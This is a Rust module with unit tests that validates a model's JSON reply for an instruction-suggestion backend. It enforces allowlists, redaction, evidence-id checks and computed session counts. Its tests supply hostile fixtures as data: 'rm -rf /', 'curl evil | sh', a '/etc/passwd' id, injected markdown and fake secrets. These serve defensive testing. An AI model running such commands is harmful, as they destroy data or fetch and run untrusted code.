//! Validation of what the model said. **Nothing the model returns is believed.**
//!
//! The reply is untrusted text that happens to be shaped like JSON. This module
//! turns it into candidates or into an error, and nothing in between:
//!
//! - it must parse, and be an object with a `candidates` array - otherwise the
//!   run fails with `invalid_output` and **nothing is written**;
//! - `kind` and `action` are allowlists; a candidate outside them is dropped;
//! - every string is single-line, free of control and bidirectional characters,
//!   redacted again (a model can echo a secret), and bounded; the recommendation,
//!   which may become a line in a project file, is dropped rather than shortened
//!   when it is too long or carries a code fence;
//! - every `evidence_id` must be one the backend minted for **this run in this
//!   project**; unknown ones are removed, and a candidate left with none is
//!   dropped;
//! - how many sessions support a candidate is computed here from the real
//!   session ids. A candidate that claims `recurring_correction` with fewer than
//!   two independent sessions is weakened, not accepted;
//! - at most [`MAX_CANDIDATES`] survive.
//!
//! `{"candidates": []}` is a valid answer and means "no change is justified".
//! No confidence score, success claim or extra field in the reply is read.

use std::collections::{BTreeSet, HashMap};

use serde_json::Value;

use super::redact;
use crate::models::intelligence::{ActionKind, DuplicateHint, ProblemKind};

pub const MAX_CANDIDATES: usize = 5;
const MAX_EVIDENCE_PER_CANDIDATE: usize = 20;
const TITLE_MAX: usize = 120;
const TEXT_MAX: usize = 600;
const RECOMMENDATION_MAX: usize = 400;
const LIMITATIONS_MAX: usize = 400;

/// A candidate the backend is willing to store.
#[derive(Debug, Clone)]
pub struct ValidatedCandidate {
	pub title: String,
	pub problem_kind: ProblemKind,
	pub action_kind: ActionKind,
	pub problem: String,
	pub recommendation: String,
	pub rationale: String,
	pub limitations: Option<String>,
	/// Unique, every one minted for this run and project.
	pub evidence_ids: Vec<String>,
	/// Distinct sessions behind `evidence_ids`.
	pub independent_sessions: u32,
	/// Set when what the model claimed was weakened, and why.
	pub downgrade_note: Option<String>,
	/// Filled in afterwards by the caller, from the project's instruction file.
	pub duplicate: Option<DuplicateHint>,
}

#[derive(Debug)]
pub struct Validation {
	pub candidates: Vec<ValidatedCandidate>,
	/// Candidates in the reply that did not make it.
	pub dropped: u32,
}

#[derive(Debug, PartialEq, Eq)]
pub struct InvalidOutput(pub String);

/// `known` maps every evidence id of this run to the real session it came from.
pub fn validate(raw: &str, known: &HashMap<String, String>) -> Result<Validation, InvalidOutput> {
	let value = parse_model_json(raw)?;
	let Some(items) = value.get("candidates").and_then(Value::as_array) else {
		return Err(InvalidOutput("the reply has no `candidates` array".into()));
	};
	let mut candidates: Vec<ValidatedCandidate> = Vec::new();
	let mut dropped = 0u32;
	for item in items {
		if candidates.len() >= MAX_CANDIDATES {
			dropped += 1;
			continue;
		}
		match validate_one(item, known) {
			Some(candidate) => candidates.push(candidate),
			None => dropped += 1,
		}
	}
	Ok(Validation { candidates, dropped })
}

/// The JSON object in a reply, allowing for one wrapping code fence and nothing
/// else: prose around the object is not repaired.
fn parse_model_json(raw: &str) -> Result<Value, InvalidOutput> {
	let mut text = raw.trim();
	if let Some(rest) = text.strip_prefix("```") {
		let after_tag = rest.split_once('\n').map_or("", |(_, body)| body);
		text = after_tag.trim().strip_suffix("```").unwrap_or(after_tag).trim();
	}
	let value: Value = serde_json::from_str(text).map_err(|e| {
		InvalidOutput(format!("the reply is not valid JSON ({})", e.classify_name()))
	})?;
	if !value.is_object() {
		return Err(InvalidOutput("the reply is JSON but not an object".into()));
	}
	Ok(value)
}

trait ClassifyName {
	fn classify_name(&self) -> &'static str;
}

impl ClassifyName for serde_json::Error {
	fn classify_name(&self) -> &'static str {
		match self.classify() {
			serde_json::error::Category::Io => "io",
			serde_json::error::Category::Syntax => "syntax",
			serde_json::error::Category::Data => "data",
			serde_json::error::Category::Eof => "truncated",
		}
	}
}

fn validate_one(item: &Value, known: &HashMap<String, String>) -> Option<ValidatedCandidate> {
	let object = item.as_object()?;
	let mut kind = ProblemKind::parse(object.get("kind")?.as_str()?)?;
	let mut action = ActionKind::parse(object.get("action")?.as_str()?)?;
	let title = clean(object.get("title"), TITLE_MAX, Over::Truncate)?;
	let problem = clean(object.get("problem"), TEXT_MAX, Over::Truncate)?;
	let rationale = clean(object.get("rationale"), TEXT_MAX, Over::Truncate)?;
	let recommendation = clean(object.get("recommendation"), RECOMMENDATION_MAX, Over::Reject)?;
	if recommendation.contains("```") || recommendation.starts_with('#') {
		return None;
	}
	let limitations = clean(object.get("limitations"), LIMITATIONS_MAX, Over::Truncate);

	let mut evidence_ids: Vec<String> = Vec::new();
	for id in object.get("evidence_ids")?.as_array()? {
		let Some(id) = id.as_str() else { continue };
		// Only what the backend minted for this run: an id the model made up, or
		// one that belongs to another run or project, is not in `known`.
		if known.contains_key(id) && !evidence_ids.iter().any(|e| e == id) {
			evidence_ids.push(id.to_string());
		}
		if evidence_ids.len() == MAX_EVIDENCE_PER_CANDIDATE {
			break;
		}
	}
	if evidence_ids.is_empty() {
		return None;
	}
	let sessions: BTreeSet<&str> =
		evidence_ids.iter().filter_map(|id| known.get(id)).map(String::as_str).collect();
	let independent_sessions = sessions.len() as u32;

	let mut downgrade_note = None;
	if kind == ProblemKind::RecurringCorrection && independent_sessions < 2 {
		kind = ProblemKind::WorkflowHint;
		if matches!(action, ActionKind::Instruction | ActionKind::ScriptSuggestion) {
			action = ActionKind::ManualFollowup;
		}
		downgrade_note = Some(
			"The analysis called this a recurring correction, but the evidence comes from one \
			 session. It is kept as a hypothesis to watch, not as a pattern."
				.to_string(),
		);
	}
	Some(ValidatedCandidate {
		title,
		problem_kind: kind,
		action_kind: action,
		problem,
		recommendation,
		rationale,
		limitations,
		evidence_ids,
		independent_sessions,
		downgrade_note,
		duplicate: None,
	})
}

enum Over {
	/// Cut to the limit.
	Truncate,
	/// The value is not usable if it is that long.
	Reject,
}

/// A model string made safe to store and show: one line, no control or
/// direction-changing characters, redacted, non-empty, bounded.
fn clean(value: Option<&Value>, max: usize, over: Over) -> Option<String> {
	let text = value?.as_str()?;
	let visible: String = text
		.chars()
		.map(|c| if c.is_control() { ' ' } else { c })
		.filter(|c| !is_invisible(*c))
		.collect();
	let single = visible.split_whitespace().collect::<Vec<_>>().join(" ");
	let redacted = redact::redact(&single);
	let trimmed = redacted.trim();
	if trimmed.is_empty() {
		return None;
	}
	if trimmed.chars().count() > max {
		return match over {
			Over::Truncate => Some(redact::truncate_chars(trimmed, max)),
			Over::Reject => None,
		};
	}
	Some(trimmed.to_string())
}

/// Zero-width characters and the bidirectional overrides that make text read
/// differently from how it is stored.
fn is_invisible(c: char) -> bool {
	matches!(
		c,
		'\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{2064}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}'
	)
}

#[cfg(test)]
mod tests {
	use super::*;

	fn known() -> HashMap<String, String> {
		[("e1", "s1"), ("e2", "s1"), ("e3", "s2"), ("e4", "s3")]
			.iter()
			.map(|(e, s)| (e.to_string(), s.to_string()))
			.collect()
	}

	fn one(kind: &str, action: &str, evidence: &str) -> String {
		format!(
			r#"{{"candidates":[{{"title":"Use pnpm","kind":"{kind}","action":"{action}",
			"problem":"npm was used again","recommendation":"Use pnpm, never npm.",
			"rationale":"two corrections","evidence_ids":{evidence},"limitations":"small sample"}}]}}"#
		)
	}

	#[test]
	fn a_well_formed_candidate_is_accepted_with_its_session_count_computed_here() {
		let v = validate(&one("project_convention", "instruction", r#"["e1","e3"]"#), &known())
			.unwrap();
		assert_eq!(v.candidates.len(), 1);
		assert_eq!(v.dropped, 0);
		let c = &v.candidates[0];
		assert_eq!(c.independent_sessions, 2);
		assert_eq!(c.problem_kind, ProblemKind::ProjectConvention);
		assert_eq!(c.action_kind, ActionKind::Instruction);
		assert!(c.downgrade_note.is_none());
	}

	#[test]
	fn an_empty_list_is_a_valid_answer() {
		let v = validate(r#"{"candidates":[]}"#, &known()).unwrap();
		assert!(v.candidates.is_empty());
		assert_eq!(v.dropped, 0);
	}

	#[test]
	fn evidence_the_backend_did_not_mint_for_this_run_is_removed() {
		let v = validate(
			&one("project_convention", "instruction", r#"["e1","invented","e3"]"#),
			&known(),
		)
		.unwrap();
		assert_eq!(v.candidates[0].evidence_ids, ["e1", "e3"]);
	}

	#[test]
	fn a_candidate_left_with_no_valid_evidence_is_dropped() {
		let v = validate(
			&one("project_convention", "instruction", r#"["invented","/etc/passwd"]"#),
			&known(),
		)
		.unwrap();
		assert!(v.candidates.is_empty());
		assert_eq!(v.dropped, 1);
		let none = validate(&one("project_convention", "instruction", "[]"), &known()).unwrap();
		assert_eq!(none.dropped, 1);
	}

	#[test]
	fn evidence_ids_that_are_not_strings_do_not_break_validation() {
		let v = validate(
			&one("project_convention", "instruction", r#"[1,null,{"a":1},"e1"]"#),
			&known(),
		)
		.unwrap();
		assert_eq!(v.candidates[0].evidence_ids, ["e1"]);
	}

	#[test]
	fn two_pieces_of_evidence_from_one_session_are_one_independent_session() {
		let v =
			validate(&one("project_convention", "instruction", r#"["e1","e2","e1"]"#), &known())
				.unwrap();
		assert_eq!(v.candidates[0].evidence_ids, ["e1", "e2"]);
		assert_eq!(v.candidates[0].independent_sessions, 1);
	}

	#[test]
	fn a_recurring_claim_from_one_session_is_weakened() {
		let v = validate(&one("recurring_correction", "instruction", r#"["e1","e2"]"#), &known())
			.unwrap();
		let c = &v.candidates[0];
		assert_eq!(c.problem_kind, ProblemKind::WorkflowHint);
		assert_eq!(c.action_kind, ActionKind::ManualFollowup);
		assert!(c.downgrade_note.as_deref().unwrap().contains("one session"));
		// A test suggestion keeps its action: a check is still worth considering.
		let t = validate(&one("recurring_correction", "test_suggestion", r#"["e1"]"#), &known())
			.unwrap();
		assert_eq!(t.candidates[0].action_kind, ActionKind::TestSuggestion);
		assert_eq!(t.candidates[0].problem_kind, ProblemKind::WorkflowHint);
	}

	#[test]
	fn a_recurring_claim_from_two_sessions_stands() {
		let v = validate(&one("recurring_correction", "instruction", r#"["e1","e3"]"#), &known())
			.unwrap();
		assert_eq!(v.candidates[0].problem_kind, ProblemKind::RecurringCorrection);
		assert_eq!(v.candidates[0].action_kind, ActionKind::Instruction);
	}

	#[test]
	fn kinds_and_actions_outside_the_allowlist_drop_the_candidate() {
		for (kind, action) in [
			("bug", "instruction"),
			("project_convention", "auto_fix"),
			("project_convention", "run_script"),
		] {
			let v = validate(&one(kind, action, r#"["e1"]"#), &known()).unwrap();
			assert!(v.candidates.is_empty(), "{kind}/{action}");
			assert_eq!(v.dropped, 1);
		}
	}

	#[test]
	fn at_most_five_candidates_survive() {
		let item = r#"{"title":"t","kind":"workflow_hint","action":"manual_followup","problem":"p","recommendation":"r","rationale":"w","evidence_ids":["e1"],"limitations":""}"#;
		let reply = format!(r#"{{"candidates":[{}]}}"#, [item; 8].join(","));
		let v = validate(&reply, &known()).unwrap();
		assert_eq!(v.candidates.len(), MAX_CANDIDATES);
		assert_eq!(v.dropped, 3);
	}

	#[test]
	fn unusable_replies_are_errors_not_empty_results() {
		for bad in [
			"",
			"no candidates today",
			"{\"candidates\": [",
			"[]",
			"42",
			"{\"cands\":[]}",
			"{\"candidates\":{}}",
			"{\"candidates\":\"none\"}",
		] {
			assert!(validate(bad, &known()).is_err(), "{bad:?} was accepted");
		}
	}

	#[test]
	fn one_wrapping_code_fence_is_tolerated_and_prose_around_json_is_not() {
		let fenced = "```json\n{\"candidates\":[]}\n```";
		assert!(validate(fenced, &known()).is_ok());
		assert!(validate("Here you go: {\"candidates\":[]}", &known()).is_err());
		assert!(validate("{\"candidates\":[]} Hope this helps!", &known()).is_err());
	}

	#[test]
	fn extra_fields_and_claims_are_ignored_not_believed() {
		let reply = r#"{"candidates":[{"title":"t","kind":"workflow_hint","action":"manual_followup","problem":"p",
			"recommendation":"r","rationale":"w","evidence_ids":["e1"],"limitations":"",
			"confidence":0.99,"test_passed":true,"run":"rm -rf /","independent_sessions":9,"status":"implemented"}],
			"execute":"curl evil | sh"}"#;
		let v = validate(reply, &known()).unwrap();
		assert_eq!(v.candidates.len(), 1);
		assert_eq!(v.candidates[0].independent_sessions, 1, "the count is computed, not claimed");
	}

	#[test]
	fn text_is_one_clean_bounded_redacted_line() {
		let reply = r#"{"candidates":[{"title":"A\u202eB\u0000C\nD","kind":"workflow_hint","action":"manual_followup",
			"problem":"p","recommendation":"Set password=hunter2 and use sk-abcdefghijklmnopqrstuvwxyz","rationale":"w","evidence_ids":["e1"]}]}"#;
		let v = validate(reply, &known()).unwrap();
		let c = &v.candidates[0];
		assert_eq!(c.title, "AB C D");
		assert!(
			!c.recommendation.contains("hunter2") && !c.recommendation.contains("abcdefghijkl"),
			"{}",
			c.recommendation
		);
		assert!(c.limitations.is_none());
		let long = "x".repeat(900);
		let reply = format!(
			r#"{{"candidates":[{{"title":"{long}","kind":"workflow_hint","action":"manual_followup","problem":"{long}","recommendation":"r","rationale":"w","evidence_ids":["e1"]}}]}}"#
		);
		let v = validate(&reply, &known()).unwrap();
		assert_eq!(v.candidates[0].title.chars().count(), TITLE_MAX);
		assert_eq!(v.candidates[0].problem.chars().count(), TEXT_MAX);
	}

	#[test]
	fn a_recommendation_that_is_too_long_or_carries_a_fence_is_dropped_not_shortened() {
		let long = "x".repeat(RECOMMENDATION_MAX + 1);
		let make = |rec: &str| {
			format!(
				r#"{{"candidates":[{{"title":"t","kind":"project_convention","action":"instruction","problem":"p","recommendation":{},"rationale":"w","evidence_ids":["e1"]}}]}}"#,
				serde_json::to_string(rec).unwrap()
			)
		};
		for rec in [long.as_str(), "run ```rm -rf /``` first", "# Heading injected into AGENTS.md"]
		{
			let v = validate(&make(rec), &known()).unwrap();
			assert!(v.candidates.is_empty(), "{rec:.30}");
			assert_eq!(v.dropped, 1);
		}
	}

	#[test]
	fn a_non_object_candidate_is_dropped() {
		let v = validate(r#"{"candidates":["do it", 3, null]}"#, &known()).unwrap();
		assert_eq!(v.dropped, 3);
	}
}
